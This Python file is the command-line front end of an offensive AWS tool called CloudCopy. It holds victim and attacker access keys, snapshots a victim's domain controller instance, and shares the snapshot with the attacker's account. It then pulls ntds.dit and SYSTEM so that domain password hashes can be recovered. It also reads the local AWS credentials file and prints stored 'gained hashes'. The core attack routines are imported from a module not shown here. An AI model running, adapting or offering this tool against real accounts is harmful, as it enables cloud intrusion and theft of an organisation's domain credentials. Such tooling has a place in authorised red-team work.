import abc
import cmd
import glob
import os
import re
import readline

from CloudCopyUtils import CloudCopyUtils

# These might change, I'll probably forget to update it
REGIONS = ['us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-east-1',
           'ap-south-1', 'ap-northeast-2', 'ap-southeast-1', 'ap-southeast-2',
           'ap-northeast-1', 'ca-central-1', 'cn-north-1', 'cn-northwest-1',
           'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1',
           'sa-east-1', 'us-gov-east-1', 'us-gov-west-1']

if 'libedit' in readline.__doc__:
    readline.parse_and_bind("bind ^I rl_complete")
else:
    readline.parse_and_bind("tab: complete")


class BaseCmdInterpreter(cmd.Cmd):

    def __init__(self):
        self.options = {'youraccountid': '', 'localkeypath': ''}
        super(BaseCmdInterpreter, self).__init__()

    def do_exit(self, args):
        return True

    def emptyline(self):
        pass

    def _complete_path(self, path):
        if os.path.isdir(path):
            return glob.glob(os.path.join(path, '*'))
        else:
            return glob.glob(path + '*')

    def _complete_profiles(self):
        from os.path import expanduser
        home = expanduser("~")
        credentials = open(home+"/.aws/credentials").read()
        profiles = re.findall('\[.+\]', credentials)
        return list(map(lambda x:x[1:-1], profiles))

    def do_list_hashes(self, args):
        """list_hashes
        Display previously gained hashes"""
        secrets = glob.glob("./secrets*")
        if len(secrets) > 0:
            for secret in secrets:
                print(open(secret).read())
        else:
            print("no hashes found yet")

    def do_set(self, line):
        """set [property] [value]
        Set the CloudCopy properties"""
        arguments = [l for l in line.split()]
        if len(arguments) < 2:
            print("Not enough arguments")
        else:
            self.options[arguments[0]] = arguments[1]

    def complete_set(self, text, line, begidx, endidx):
        options = self.options.keys()

        if 'localkeypath' in line:
            mline = line.split(' ')[-1]
            offs = len(mline) - len(text)
            completions = []
            if line.split()[-2] == 'localkeypath':
                completions = self._complete_path(mline)
            return [s[offs:] for s in completions if s.startswith(mline)]
        elif 'region' in line:
            if text:
                completions = [f
                               for f in REGIONS
                               if f.startswith(text)
                               ]
            else:
                completions = REGIONS
        elif 'Profile' in line:
            if text:
                completions = [f
                               for f in self._complete_profiles()
                               if f.startswith(text)]
            else:
                completions = self._complete_profiles()
        else:
            completions = [f
                           for f in options
                           if f.startswith(text)
                           ]
        return completions

    def do_show_options(self, args):
        """show_options
        Show CloudCopy properties and their currently set values"""
        print(self.options)


class BaseCloudCopy(BaseCmdInterpreter, abc.ABC):

    def __init__(self):
        self.cloudCopier = None
        BaseCmdInterpreter.__init__(self)
        abc.ABC.__init__(self)

    @abc.abstractmethod
    def do_stealDCHashes(self, args):
        """stealDCHashes
        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""
        pass

    def stealExistingInstance(self):
        self.cloudCopier.createInstance(self.options['localkeypath'])
        self.cloudCopier.grabDCHashFiles(self.options['localkeypath'])

    def stealNewInstance(self):
        self.cloudCopier.listInstances()
        if self.cloudCopier.createSnapshot():
            print("Snapshot created, sharing it with attacker account")
            self.cloudCopier.modifySnapshot(self.options['youraccountid'])
        self.cloudCopier.createSecurityGroup()
        self.cloudCopier.createInstance(self.options['localkeypath'])
        self.cloudCopier.grabDCHashFiles(self.options['localkeypath'])


class ProfileCloudCopy(BaseCloudCopy):

    def __init__(self, parentOptions):
        super(ProfileCloudCopy, self).__init__()
        self.prompt = "(Profile CloudCopy)"
        self.options = parentOptions
        self.options['region'] = ''
        self.options['instance_id'] = ''
        self.options['attackerProfile'] = ''
        self.options['victimProfile'] = ''

    def do_stealDCHashes(self, args):
        if '' not in self.options.values:
            if self.options['instance_id'] != '':
                self.cloudCopier = CloudCopyUtils({'type': 'profile', 'options': self.options}, 'attacker')
                self.stealExistingInstance()
            else:
                self.cloudCopier = CloudCopyUtils({'type': 'profile', 'options': self.options}, 'victim')
                self.stealNewInstance()
        else:
            print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")


class ManualCloudCopy(BaseCloudCopy):

    def __init__(self, parentOptions):
        super(ManualCloudCopy, self).__init__()
        self.prompt = "(Manual CloudCopy)"
        self.options = parentOptions
        self.options['region'] = ''
        self.options['instance_id'] = ''
        self.options['attackerAccessKey'] = ''
        self.options['attackerSecretKey'] = ''
        self.options['victimAccessKey'] = ''
        self.options['victimSecretKey'] = ''

    def do_stealDCHashes(self, args):
        if self.options['instance_id'] != '':
            self.cloudCopier = CloudCopyUtils({'type': 'manual', 'options': self.options}, 'attacker')
            self.stealExistingInstance()
        else:
            self.cloudCopier = CloudCopyUtils({'type': 'manual', 'options': self.options}, 'victim')
            self.stealNewInstance()

class MainMenu(BaseCmdInterpreter):

    def __init__(self):
        super(MainMenu, self).__init__()
        self.prompt = "(CloudCopy)"

    def reset_options(self):
        self.options = {'youraccountid': '', 'localkeypath': ''}

    def do_profile_login(self, args):
        """profile_login
        CloudCopy attack using .aws/credential profiles to authenticate"""
        sub_cmd = ProfileCloudCopy(self.options)
        sub_cmd.cmdloop()
        self.reset_options()

    def do_manual_login(self, args):
        """manual_login
        CloudCopy attack using manually set attacker/victim access/secret keys to authenticate"""
        sub_cmd = ManualCloudCopy(self.options)
        sub_cmd.cmdloop()
        self.reset_options()


if __name__ == '__main__':
    cmd = MainMenu()
    cmd.cmdloop()
